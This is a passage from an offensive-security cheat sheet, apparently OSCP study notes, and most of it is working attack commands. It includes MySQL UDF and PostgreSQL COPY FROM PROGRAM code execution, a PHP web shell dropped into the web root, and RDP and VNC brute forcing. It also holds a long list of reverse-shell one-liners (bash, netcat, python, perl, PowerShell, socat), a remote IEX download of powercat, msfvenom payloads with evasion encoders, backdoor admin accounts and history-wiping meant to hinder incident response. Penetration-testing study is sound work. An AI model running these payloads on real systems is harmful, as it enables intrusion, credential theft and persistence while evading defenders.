grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to test identified by 'test' WITH GRANT OPTION;
-- show exact privileges
use information_schema; select grantee, table_schema, privilege_type from schema_privileges;
select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user where user='OUTPUT OF select user()';
```

### 2.17.1 MySQL UDF Exploit

Exploiting User-Defined Functions in MySQL to get shell execution. First,
ready the UDF library (provides `sys_exec` function) locally on the server.

Prerequisites:
- Write permission (INSERT) for the database’s "func" table
- FILE privileges to copy our library (shared object) to the plugin directory

```sh
# find sqlmap's copy of lib_mysqludf_sys.so (or dll)
locate lib_mysqludf_sys
# found in /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.so
# copy the file into the server's /tmp/lib_mysqludf_sys.so for examples below
```

In MySQL terminal:

```sql
-- checking permissions
select * from mysql.user where user = substring_index(user(), '@', 1);
-- checking architecture
select @@version_compile_os, @@version_compile_machine;
-- or
show variables like '%compile%';
-- checking plugin directory (where to drop udf library)
select @@plugin_dir;
-- or
show variables like 'plugin%';

-- Linux
use mysql;
create table npn(line blob);
insert into npn values(load_file('/tmp/lib_mysqludf_sys.so'));
select * from npn into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';
-- alternative: hex encode .so file and dump it directly:
select binary 0x<shellcode> into dumpfile '<plugin_dir>/lib_mysqludf_sys.so';
create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
select sys_exec('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
-- then start local shell with `/tmp/rootbash -p` to get root

-- Windows
use mysql;
create table npn(line blob);
insert into npn values(load_files('c://temp//lib_mysqludf_sys_32.dll'));
select * from mysql.npn into dumpfile 'c://windows//system32//lib_mysqludf_sys_32.dll';
-- alternative: dump hex shellcode directly into file:
select binary 0x<shellcode> into dumpfile '<plugin_dir>/lib_mysqludf_sys_32.dll';
create function sys_exec returns integer soname 'lib_mysqludf_sys_32.dll';
select sys_exec("net user derp Herpderp1! /add");
select sys_exec("net localgroup administrators derp /add");
```

### 2.17.2 Grabbing MySQL Passwords

```sh
# contains plain-text password of the user debian-sys-maint
cat /etc/mysql/debian.cnf

# contains all the hashes of the MySQL users (same as what's in mysql.user table)
grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
```

### 2.17.3 Useful MySQL Files

- Configuration Files:
  - Windows
    - config.ini
    - my.ini
    - windows\my.ini
    - winnt\my.ini
    - INSTALL_DIR/mysql/data/
  - Unix
    - my.cnf
    - /etc/my.cnf
    - /etc/mysql/my.cnf
    - /var/lib/mysql/my.cnf
    - ~/.my.cnf
    - /etc/my.cnf
- Command History:
  - ~/.mysql.history
- Log Files:
  - connections.log
  - update.log
  - common.log


## 2.18 RDP - 3389

**Connect to Windows RDP**:

```sh
xfreerdp /d:domain /u:username /p:password +clipboard /cert:ignore /size:960x680 /v:$VICTIM_IP
# to attach a drive, use:
# /drive:share,/mnt/vm-share/oscp/labs/public/5-alice/loot

# using pass-the-hash to connect:
# replace /p: with /pth:NTHASH
xfreerdp /u:Administrator /d:SVCORP /pth:63485d30576a1a741106e3e800053b34 /v:$VICTIM_IP
```


**Bruteforce RDP Credentials:**

```sh
# brute force single user's password (watch out for account lockout! check password policy with MSRPC)
hydra -l Administrator -P /usr/share/wordlists/rockyour.txt rdp://VICTIM_IP

# password spray against list of users
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://VICTIM_IP
```


**Add RDP User**: (good for persistence)

```powershell
net user derp herpderp /add
net localgroup Administrators derp /add
net localgroup "Remote Desktop Users" derp /add
# enable remote desktop
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
# delete user
net user hacker /del
# disable remote desktop
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
```



## 2.19 PostgreSQL - 5432

[HackTricks - Pentesting PostgreSQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql)

**Connect:**

```sh
psql -U <myuser> # Open psql console with user (default: postgres)
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

**Interacting/Useful commands:**

**NOTE**: `psql` supports tab completion for table names, db names.

```postgresql
-- List databases
SELECT datname FROM pg_database;
\l
\list

-- List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

\c <database> -- use (connect to) the database
\d -- List tables
\d+ <tablename> -- describe table
-- SQL standard way to describe table:
select column_name, data_type from information_schema.columns where table_name = <tablename>

-- Get current user
Select user;
\du+ -- Get users roles

--Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

-- Get languages
SELECT lanname,lanacl FROM pg_language;

-- Show installed extensions
SHOW rds.extensions;

-- Get history of commands executed
\s

-- Check if current user is superuser 
-- (superuser always has file read/write/execute permissions)
-- 'on' if true, 'off' if false
SELECT current_setting('is_superuser');
```

**Reading text files:**

```postgresql
select string_agg((select * from pg_read_file('/etc/passwd', 0, 1000000)), ' | ')
```

**Writing 1-liner text files:**

```postgresql
-- base64 payload: '<?php system($_GET["cmd"]);?>'
copy (select convert_from(decode('PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7Pz4K','base64'),'utf-8')) to '/var/www/html/ws.php'
```

**Code Execution:**

```postgresql
DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Drop the table you want to use if it already exists
CREATE TABLE cmd_exec(cmd_output text); -- Create the table you want to hold the command output
COPY cmd_exec FROM PROGRAM 'id';        -- Run the system command via the COPY FROM PROGRAM function
SELECT * FROM cmd_exec;                 -- [Optional] View the results
DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Remove the table
```

You can put any bash shell command in the string after PROGRAM (e.g. replace `'id'` with `'/bin/bash -c \"bash -i >& /dev/tcp/LISTEN_IP/443 0>&1\"'`.


Postgres syntax is different from MySQL and MSSQL, and it's stricter about types. This leads to differences when doing SQL injection.

- String concat operator: `||`
- LIKE operator: `~~`
- Match regex (case sensitive): `~`
- [More operator documentation](https://www.postgresql.org/docs/6.3/c09.htm)

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-error-based) has great documentation on Postgres injection.


Interesting Groups/Roles:

- **`pg_execute_server_program`** can **execute** programs
- **`pg_read_server_files`** can **read** files
- **`pg_write_server_files`** can **write** files



## 2.20 VNC - 5900,5800

VNC is a graphical remote desktop sharing system running on TCP port 5900, with a web interface on port 5800.

```sh
# nmap scan
nmap -v -n -sV --script vnc-info,realvnc-auth-bypass,vnc-title -oA nmap/vnc -p 5900 $VICTIM_IP

# connect ('-passwd passwd.txt' to use password file)
vncviewer $VICTIM_IP

# bruteforcing
hydra -V -f -L user.txt –P pass.txt -s PORT vnc://$VICTIM_IP
medusa -h $VICTIM_IP –u root -P pass.txt –M vnc
ncrack -V --user root -P pass.txt $VICTIM_IP:PORT
patator vnc_login host=$VICTIM_IP password=FILE0 0=pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0use auxiliary/scanner/vnc/vnc_login
```



## 2.21 MongoDB - 27017

MongoDB is a common open-source NoSQL database. It's service runs on 27017 by
default.

Compared to SQL databases:
- Instead of tables, it has *collections*
- Instead of rows, it has *documents*
- Instead of columns, it has *fields*

Data is stored using [BSON](https://bsonspec.org/), which is a binary-serialized form of JSON.

```sql
# starting mongo app, connecting to database server
mongosh     # connect to localhost:27017, no creds
mongosh -u <user> -p <password>
mongosh hostname:port
mongosh --host <host> --port <port>

# show list of databases
show databases;
# connect to database named "admin"
use admin;
# list names of collections (tables) in connected database
db.getCollectionNames();
# create new collection (table) called "users"
db.createCollection("users")
# create new document (row) in users collection:
db.users.insert({id:"1", username: "derp", email: "derp@derp.com", password: "herpderp"})
# show all documents (rows) in the users collection:
db.users.find()
# get all documents matching search criteria
db.users.find({id: {$gt: 5}})
# get first matching user document
db.users.findOne({id: '1'})
# change fields in a users document
db.users.update({id:"1"}, {$set: {username: "bubba"}});
# delete a document (by id)
db.users.remove({'id':'1'})
# drop the users collection (delete everything)
db.users.drop()
```

[Operators](https://docs.mongodb.com/manual/reference/operator/query/) (for searches/matching):

- $eq
- $ne
- $gt
- $lt
- $and
- $or
- $where
- $exists
- $regex



## 2.22 Amazon Web Services (AWS) S3 Buckets

Format of the bucket and resource (file) in urls:

```
http://BUCKETNAME.s3.amazonaws.com/FILENAME.ext
http://s3.amazonaws.com/BUCKETNAME/FILENAME.ext
```

If the buckets have ACL rules set to allow `Anyone`, then you can list the
contents as an unauthenticated user. If the ACL allows `AuthenticatedUsers`,
any logged-in AWS customer in the world can list the bucket contents.

Listing bucket contents without being authenticated:

```sh
# over HTTP (can be done in browser)
curl http://irs-form-990.s3.amazonaws.com/

# using the AWS CLI 'ls', '--no-sign-request' means without authentication
aws s3 ls s3://irs-form-990/ --no-sign-request
```

Downloading files from AWS Buckets without being authenticated:

```sh
# over HTTP (can be done in browser)
curl http://irs-form-990.s3.amazonaws.com/201101319349101615_public.xml

# using the AWS CLI 'cp', '--no-sign-request' means without authentication
aws s3 cp s3://irs-form-990/201101319349101615_public.xml . --no-sign-request
```

### 2.22.1 AWS Identity and Access Management (IAM)

Excluding a few older services like Amazon S3, all requests to AWS services must be signed. This is typically done behind the scenes by the AWS CLI or the various Software development Kits that AWS provides. The signing process leverages IAM Access Keys. These access keys are one of the primary ways an AWS account is compromised.


#### 2.22.1.1 IAM Access Keys

IAM Access Keys consist of an Access Key ID and the Secret Access Key.

**Access Key IDs** always begin with the letters `AKIA` and are **20 characters long**.
These act as a user name for the AWS API.

The **Secret Access Key** is **40 characters long**. AWS generates both strings;
however, AWS doesn't make the Secret Access Key available to download after the
initial generation.

There is another type of credentials, **short-term credentials**, where the
Access Key ID **begins with the letters `ASIA`** and includes an additional
string called the Session Token.

#### 2.22.1.2 Conducting Reconnaissance with IAM

When you find credentials to AWS, you can add them to your AWS Profile in the
AWS CLI. For this, you use the command:

```sh
aws configure --profile PROFILENAME
```

This command will add entries to the `.aws/config` and `.aws/credentials` files in your user's home directory.

**ProTip**: Never store a set of access keys in the `[default]` profile (without adding the `--profile` flag). Doing so  forces you always to specify a profile and never accidentally run a  command against an account you don't intend to.



A few other common AWS reconnaissance techniques are:

1. Finding the Account ID belonging to an access key:

   `aws sts get-access-key-info --access-key-id AKIAEXAMPLE`

2. Determining the Username the access key you're using belongs to

   `aws sts get-caller-identity --profile PROFILENAME`

3. Listing all the EC2 instances running in an account

   `aws ec2 describe-instances --output text --profile PROFILENAME`

4. Listing all the EC2 instances running in an account in a different region
   `aws ec2 describe-instances --output text --region us-east-1 --profile PROFILENAME`

4. Listing all secrets stored in AWS Secrets Manager for a given profile
   `aws secretsmanager list-secrets --profile PROFILENAME`

4. Reveal the encrypted contents of a secret (secrets might be region-specific).
   `aws secretsmanager get-secret-value --secret-id <friendlyname-or-ARN> --profile PROFILENAME [--region eu-north-1]`

#### 2.22.1.3 AWS ARNs

An Amazon ARN is their way of generating a unique identifier for all resources in the AWS Cloud. It consists of multiple strings separated by colons.

The format is:

```
arn:aws:<service>:<region>:<account_id>:<resource_type>/<resource_name>
```




# 3 Exploitation

## 3.1 Searchsploit

```sh
searchsploit -www query # show exploitdb link instead
searchsploit -x /path/to/exploit # read ("eXamine") the exploit file
searchsploit -m /path/to/exploit # mirror exploit file to current directory
```


## 3.2 Cracking Password Hashes

Here are my favorite wordlists to try:

```
/usr/share/wordlists/fasttrack.txt
/usr/share/wordlists/rockyou.txt
```

### 3.2.1 Identifying Unknown Hash Format

```sh
hashid 'HASHGOESHERE'
hash-identifier 'HASHGOESHERE'
```

I also have my [hashcat mode finder](https://github.com/camercu/dotfiles/blob/main/hashcat-mode-finder/hashcat-mode-finder.plugin.zsh) plugin, which does fuzzy searching on hash names and hash contents against hashcat's example hashes.

Here is a bash function version of it:

```bash
# fuzzy-search hashcat modes
# source: https://jonathanh.co.uk/blog/fuzzy-search-hashcat-modes.html
# NOTE: fzf and hashcat required to be installed
function hcmode {
    hashcat --example-hashes | grep -E 'MODE:|TYPE:|HASH:|Hash mode #|Name\.*:|Example\.Hash\.*:|^$' | awk -v RS="\n\n" -F "\t" '{gsub("\n","\t",$0); print $1 "\t" $2 "\t" $3}' | sed 's/MODE: //; s/Hash mode #//; s/TYPE: //; s/ *Name\.*: //; s/Example\.Hash\.*://; s/HASH: //' | fzf -d '\t' --header="Mode   Type" --preview='echo HASH: {3}' --preview-window=up:1 --reverse --height=40% | awk '{print $1}'
}
```



### 3.2.2 Cracking with John The Ripper

Use john for the common cases of cracking.

```sh
# afer collecting /etc/passwd and /etc/shadow
unshadow passwd shadow > unshadowed

# crack unshadow
# the "=" is required for wordlist
john --wordlist=/mnt/vm-share/rockyou.txt unshadowed

# crack hashes by feeding back in the potfile to a different hash mode
john --loopback --format=nt ntlm.hashes

# find the desired format, if john doesn't detect it automatically:
john --list=formats

# feed custom wordlist via stdin
crunch 7 7 -t @@@@@@@ | john --stdin hashes
# can also use "--pipe" to bulk read and allow rules

# resume last cracking session that was stopped mid-way
john --restore

# show cracked hashes from potfile matching those in hashfile
john --show --format=nt hashfile
```

You can add hashcat-style rules to John-the-Ripper's configuration!

- Add a new `[List.Rules:MyRules]` label to `/etc/john/john.conf`
- Under the new label, add you hashcat rules

```sh
# text to be appended to john.conf
cat my.rule
[List.Rules:MyRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#

# appending rules with label to john.conf
sudo sh -c 'cat /home/kali/passwordattacks/my.rule >> /usr/share/john/john-local.conf'
# config files, loaded in order:
# /etc/john/john.conf
# /usr/share/john/john.conf
# /usr/share/john/john-local.conf

# specifying custom ruleset to use
john --wordlist=passwords.txt --rules=MyRules ssh.hash
```

**NOTE**: John doesn't like spaces between long-options like `--wordlist`, `--rules`, and `--format` and their argument. **Make sure you use equals (`=`**)! Example `--rules=MyRules`.



### 3.2.3 Cracking with Hashcat

When to use hashcat:
- You have a hash type that john doesn't understand
- You need MOAR SPEED

```sh
# hashcat doesn't automatically ID hashes like john. You have to specify the
# hash mode manually with the "-m" flag. Look up hashcat modes at:
# https://hashcat.net/wiki/doku.php?id=example_hashes
# or do:
hashcat --help | grep -i "md5"
hashcat --example-hashes | grep -FB2 ' $1$'  # "-F"=force raw string lookup

# specify mangling rules with addition of:
-r /usr/share/hashcat/rules/best64.rule
# more extensive rule list:
-r /usr/share/hashcat/rules/d3ad0ne.rule
# Great one for rockyou.txt:
-r /usr/share/hashcat/rules/rockyou-30000.rule

# basic crack syntax:
# hashcat -m MODE [OPTIONS] HASH/FILE WORDLIST [WORDLIST...]

# common options:
# -a NUM - attack mode (0 = use wordlists, 1 = combo words in list, 3 = brute force)
# -w NUM - workload (2 = default, 3 = degrades your gui, 4 = max)

# cracking /etc/shadow with sha512crypt hashes ("$6$...")
hashcat -m1800 -a0 -w3 shadow /mnt/vm-share/rockyou.txt

# resume last cracking session that was stopped mid-way
hashcat --restore

# showing cracked hashes, with username, from /etc/shadow's sha512crypt hashes
# hashcat has a potfile (hashcat.potfile) to store old passwords
hashcat --show --user --outfile-format=2 shadow

# crack all LANMAN hashes with hashcat
# '-1' flag creates a custom alphabet to use in mask as '?1', can do -2, -3
# '--increment/-i' starts at zero-length and increments to full length of mask
# '--potfile-path' specfies custom potfile
hashcat -a 3 -m 3000 -1 "?u?d?s" --increment --potfile-path hashcat.potfile customer.ntds "?1?1?1?1?1?1?1"

# create wordlist for all passwords starting with "Summer" and ending in 2-4 digits
# '--increment-min' specifies min length to start mask bruteforce
hashcat --stdout -a 3 --increment --increment-min 2 "Summer?d?d?d?d" > wordlist
```

**NOTE**: hashcat doesn't feed usernames into the wordlists automatically like john
does, nor does it automatically reverse the usernames. To do this, you have to
manually add the usernames as an additional wordlist file, and add mangling
rules.

:warning:**NOTE**: If you see `Token Length Exception` after a failed attempt to crack hashes with hashcat, this is a known bug where it doesn't support modern encryption ciphers with certain mode numbers. In this case, ***try switching to John to crack***.

**Attack modes:**

- `0` - Straight: dictionary/wordlist, tries each word from every wordlist file once
- `1` - Combinator: using 2 wordlist files, each word from first file is prepended to each word in second file; can use same file twice
- `3` - Mask: brute force with characters fitting the supplied mask (in place of wordlist)
  - `?l` = lowercase ASCII letters
  - `?u` = uppercase ASCII letters
  - `?d` = digits 0-9
  - `?s` = printable special characters + space
  - `?a` = all of `?l` + `?u` + `?d` + `?s`
  - Example: 1 uppercase, followed by 2 lowercase, followed by 3 digits: `?u?l?l?d?d?d`
- `6` - Hybrid Wordlist + Mask: append mask to each word in wordlist
- `7` - Hybrid Mask + Wordlist: prepend mask to each word in wordlist

### 3.2.4 Making Custom Wordlists

**`cewl`** for scraping words from websites:
```sh
# cewl spiders a site starting at URL to scrape words
# -e : include emails
# --email_file FILE : save emails in separate file
# -w FILE : write words to file
# --lowercase : convert all words to lowercase
# --with-numbers : include words with numbers
# -d NUM : max depth to spider (0 = only that page)
# -m NUM : minimum word length
cewl -e --email_file emails.txt -w cewl.txt --lowercase --with-numbers -d 1 -m 5 URL
```

**`crunch`**:
```sh
# predefined charsets found in:
cat /usr/share/crunch/charset.lst

# Syntax:
# crunch <min-len> <max-len> [ charset1 [ charset2 [ charset3 [ charset4 ]]]] [options]

# Cmdline Flags:
# -t PATT : use pattern, replacing placeholders ( @ , % ^ ) (see next)
# -l PATT : literal mask - which placeholder chars in '-t' should be literal.
#           Must match length of PATT used in '-t'.
#           E.g. -t p@ssword%! -l p@sswordx! : makes @ a literal, % still placeholder
# -o FILE : write output to file
# -f : Specifies a character set from the charset.lst file
# -s WORD : start at word
# -e WORD : end at word
# -p CHARSET / WORD WORD... : permute from charset/words (no repeats), MUST BE LAST OPTION
# -q FILE : like '-p', but takes chars/words from file

# Charset Placeholders for '-t':
#   @ : 1st, or lowercase
#   , : 2nd, or uppercase
#   % : 3rd, or digits
#   ^ : 4th, or symbols

# Tip: if you don't want to count the characters in '-t' pattern, 
# just put 1 for min and max lenght. It will tell you how long 
# your pattern is when it errors out


##  Examples  =====================================================

# all possible 4 to 6 digit numeric PIN codes
crunch 4 6 0123456789

# matching template "Secret###!"
crunch 10 10 -t 'Secret%%%!' -o wordlist.txt

# every number between 1950 and 2050 (useful for years)
crunch 4 4 -t %%%% -s 1950 -e 2050

# seasonal passwords (e.g. Summer2020!)
crunch 6 6 '@!#$' -t s%%%%@ -p Spring Summer Autumn Fall Winter
```

**`hashcat`**:
```sh
# create wordlist for all passwords starting with "Summer" and ending in 2-4 digits
# '--increment-min' specifies min length to start mask bruteforce
hashcat --stdout -a 3 --increment --increment-min 2 "Summer?d?d?d?d" > wordlist
```


### 3.2.5 Password Cracking Examples

KeePass databases (`*.kdbx`):

```sh
# convert to friendly format
keepass2john Database.kdbx | tee keepass.hash

# remove "Database:" from beginning
vim keepass.hash

# crack with rockyou + rules
hashcat -m 13400 -a0 -w3 -O --force -r /usr/share/hashcat/rules/rockyou-30000.rule keepass.hash /usr/share/wordlists/rockyou.txt
```


ZIP files:

```sh
# using fcrackzip
fcrackzip -D -p /usr/share/wordlists/rockyou.txt myplace.zip

# using john
zip2john myfile.zip | tee zipkey.john
john zipkey.john --wordlist=/usr/share/wordlists/rockyou.txt
```



## 3.3 Reverse Shells

- [Pentest Monkey Cheatsheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [Reverse Shell Generator](https://www.revshells.com/)

Always start your **Netcat Listener** first!

```sh
nc -vlnp LISTEN_PORT
# on mac, exclude the "-p" flag
```

**Netcat Reverse Shell**

```sh
# if netcat has the -e flag:
nc -e /bin/sh LISTEN_IP 443
# can generate with msfvenom:
msfvenom -p cmd/unix/reverse_netcat_gaping -f raw lport=443 lhost=tun0

# if no -e flag:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LISTEN_IP 443 >/tmp/f
# can generate with msfvenom:
msfvenom -p cmd/unix/reverse_netcat -f raw lport=443 lhost=tun0
```

**Bash Reverse Shell**

```sh
# only works on Linux with bash
/bin/bash -c 'bash -i >& /dev/tcp/LISTEN_IP/443 0>&1'

# can generate with msfvenom:
msfvenom -p cmd/unix/reverse_bash -f raw lport=443 lhost=tun0
```

**Python Reverse Shell**

```sh
python -c 'import os,socket,pty;s=socket.create_connection(("LISTEN_IP",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'

# daemonizing shell for *nix hosts
python -c 'import os,sys,socket,pty;os.fork() and sys.exit();os.setsid();os.fork() and sys.exit();s=socket.create_connection(("LISTEN_IP",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'

# can generate with msfvenom:
msfvenom -p cmd/unix/reverse_python -f raw lport=443 lhost=tun0
```


**PHP Reverse Shell**

```sh
# may have to try different socket numbers besides 3 (4,5,6...)
php -r '$sock=fsockopen("LISTEN_IP",443);exec("/bin/sh -i <&3 >&3 2>&3");'
```

**Perl Reverse Shell**

```sh
perl -e 'use Socket;$i="LISTEN_IP";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# can generate with msfvenom:
msfvenom -p cmd/unix/reverse_perl -f raw lport=443 lhost=tun0
```

**Powershell Reverse Shell**

Invoke from `cmd` with `powershell -NoP -NonI -W Hidden -Exec Bypass -Command ...`

```powershell
$client = New-Object System.Net.Sockets.TCPClient("LISTEN_IP",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Alternatively, you can create a PowerShell reverse shell with msfvenom:

```sh
msfvenom -p cmd/windows/powershell_reverse_tcp -f raw -o derp.ps1 lport=443 lhost=tun0
```

If you convert to base64 on Linux for execution with `powershell -enc "BASE64ENCODEDCMD"`, use the following command to ensure you don't mess up the UTF-16LE encoding that Windows uses:

```sh
# base64-encoding custom powershell 1-liner
echo '$client = New-Object System.Net.Sockets.TCPClient("LISTEN_IP",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv -t UTF-16LE | base64 | tr -d '\n'; echo

# msfvenom version
msfvenom -p cmd/windows/powershell_reverse_tcp -f raw lport=443 lhost=tun0 | iconv -t UTF-16LE | base64 | tr -d '\n'; echo
```

Also, you can use `powercat.ps1`, a netcat equivalent in PowerShell, with "-e" support.

```sh
cp /usr/share/windows-resources/powercat/powercat.ps1 .
sudo python -m http.server 80
nc -lvnp 6969
```

Invoke with:

```powershell
IEX (New-Object System.Net.Webclient).DownloadString("http://LISTEN_IP/powercat.ps1");powercat -c LISTEN_IP -p 6969 -e powershell
```



**OpenSSL Encrypted Reverse Shell**

```sh
# generate key on server
openssl req -nodes -x509 -newkey rsa:2048 -days 365 -out cert.pem -keyout key.pem -batch
# Start server listener
sudo openssl s_server -accept 443 -key key.pem -cert cert.pem

# Client-side reverse shell
rm -f /tmp/f; mkfifo /tmp/f && openssl s_client -connect SERVER_IP:443 -quiet < /tmp/f 2>/dev/null | /bin/sh 2>&0 > /tmp/f &
```


**Socat Listener**

Great to support full tty and/or encryption. See Socat Reverse Shell (next).

```sh
# full tty over TCP
# "-dd" prints fatal, error, warning, and notice messages
socat -dd file:`tty`,raw,echo=0 TCP-LISTEN:LISTEN_PORT

# no tty, plaintext over TCP
socat -dd TCP-LISTEN:LISTEN_PORT STDOUT

# full tty, encrypted with SSL (needs socat reverse shell using OPENSSL)
socat -dd file:`tty`,raw,echo=0 OPENSSL-LISTEN:LISTEN_PORT,cert=mycert.pem,verify=0,fork
```

Note: to generate `mycert.pem` see [these instructions](#1051-create-self-signed-ssltls-certificate)


**Socat Reverse Shell**

Use with Socat Listener (previous)

```sh
# with full tty
socat -dd EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane TCP:LISTEN_IP:443

# no tty, text only
socat -dd EXEC:/bin/bash TCP:LISTEN_IP:443

# full tty, encrypted with SSL (needs socat listener uing OPENSSL-LISTEN)
socat -dd EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane OPENSSL:LISTEN_IP:443,verify=0
```

For Windows victim, replace `/bin/bash` with `cmd.exe` or `powershell.exe`



**MSFVenom**

You can use `msfvenom` to generate reverse shells easily.

```sh
# Basic Windows TCP reverse shell
msfvenom -p windows/shell_reverse_tcp -f exe -o derp.exe lport=443 lhost=tun0

# Basic Linux TCP reverse shell
msfvenom -p linux/x86/shell_reverse_tcp -f elf -o derp.elf lport=443 lhost=tun0

# web-based reverse shells
# asp
msfvenom -p windows/shell/reverse_tcp -f asp -o derp.asp lport=443 lhost=tun0
# jsp
msfvenom -p java/jsp_shell_reverse_tcp -f raw -o derp.jsp lport=443 lhost=tun0
# war
msfvenom -p java/jsp_shell_reverse_tcp -f war -o derp.war lport=443 lhost=tun0
# php
msfvenom -p php/reverse_php -f raw -o derp.php lport=443 lhost=tun0

# Windows DLL that invokes commands you tell it:
msfvenom -p windows/exec -f dll -o shell32.dll cmd="C:\windows\system32\calc.exe"
```

Getting help:

```sh
# list all available payloads
msfvenom --list payloads
# list payloads for specific platform and architecture
msfvenom -l payloads --platform windows --arch x64

# view payload options
msfvenom -p PAYLOAD --list-options

# list encoders
 msfvenom -l encoders
 
 # list allowed output formats
 msfvenom -l formats
```

Custom encoding:

- `-e x86/shikata_ga_nai` - best x86 encoder for evasion
- `-e x64/xor` - decent x64 option
- `-i / --iterations <count>` - number of encoding iterations (more = better evasion, bigger payload)

Avoiding bad bytes (requires custom encoding): `-b "\x00\x0A"`

Prepending nopsled: `-n, --nopsled <length>`

Shrinking your payload: `--smallest`

For some Windows shellcode (mainly buffer overflow exploits), you might need to specify `EXITFUNC=thread` or `EXITFUNC=seh` as an option to make sure the shellcode executes and exits cleanly.



### 3.3.1 Running a detached/daemonized process on Linux

When delivering a payload, sometimes it needs to run as a daemon so it doesn't
die when the session/connection is closed. Normally you do this with `nohup`,
`detach`, `screen`, or `tmux`, but sometimes none of those binaries are available.
Still, you can accomplish creating a daemonized process by using sub-shells:

```sh
( ( while true; do echo "insert reverse shell cmd here"; sleep 5; done &) &)
```



### 3.3.2 Covering your tracks

When you connect via a reverse/bind shell, your commands get saved in the
terminal history. To avoid logging this (to make incident response team's job
harder), use the following as your first command:

```sh
# for bash, sh
unset HISTFILE HISTSIZE HISTFILESIZE PROMPT_COMMAND
# for zsh, must tell it not to store anything in history
# source: https://stackoverflow.com/a/68679235/5202294
function zshaddhistory() {  return 1 }
```

```powershell
# for Windows PowerShell
Set-PSReadlineOption –HistorySaveStyle SaveNothing
# - or -
Remove-Module PSReadline
```



### 3.3.3 Upgrading to Interactive Shell

Use this if you have a netcat-based reverse shell coming from a Linux box.

```sh
###  In reverse shell  ##########
# you might need to fix your PATH first
export PATH='/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'

# start pty using python
python3 'import pty; pty.spawn("/bin/bash")'
# windows equivalent
c:\python27\python.exe -c 'import pty; pty.spawn("c:\windows\system32\cmd.exe")'

# Ctrl-Z, jumps you back to local shell by backgrounding reverse shell

###  In local shell  ##########
# Get TTY rows/cols for later:
stty size # prints "rows cols"
# ignore hotkeys in the local shell and get back to remote shell
stty raw -echo; fg # hit enter TWICE after this

###  In reverse shell  ##########
# set correct size for remote shell (ROWS and COLS from stty size)
stty rows ROWS cols COLS
# enable terminal colors
export TERM=xterm-256color
# reload bash to apply TERM env var
exec /bin/bash

```


## 3.4 Metasploit

The Metasploit framework is only allowed to be used on one box on the OSCP exam, but it has great tools to make exploitation and post-exploit interaction easier.

Initializing Metasploit (first time running it):

```sh
# initialize the metasploit postgres database
sudo msfdb init

# enable postgres to start on boot
sudo systemctl enable postgresql
```

After the database starts, you can use any of the following commands to manage the database:

- `msfdb reinit` - Deletes and reinitializes the database.
- `msfdb delete` - Deletes the database.
- `msfdb start` - Starts the database.
- `msfdb stop` - Stops the database.
- `msfdb status` - Shows the database status.

### 3.4.1 Interacting with Metasploit via `msfconsole`

Most common `msfconsole` commands:

```sh
# get list of commands or detailed help
help [COMMAND]
# find module you want
search KEYWORDS...
# activate the module
use NUM
# get detailed info about active module
info
# view module options
show options
# set module options
set OPTION VALUE
# execute the module
run
```

Detailed interaction reference:

```sh
# start the console
# optional args:
# -q : don't display animations, banner, and version on start
# -x '<COMMANDS>' : commands to run on start (quote the entire command string).
#                   Multiple commands separated by semicolon.
# -r FILE : load resource script (.rc) file and run those commands at start
#           (see section on resource scripts)
msfconsole


# inside the msfconsole:

# check the database status
msf6> db_status
# check what workspace you're using
# workspaces help isolate data from different assessments/subnets
# (the database saves everything)
msf6> workspace
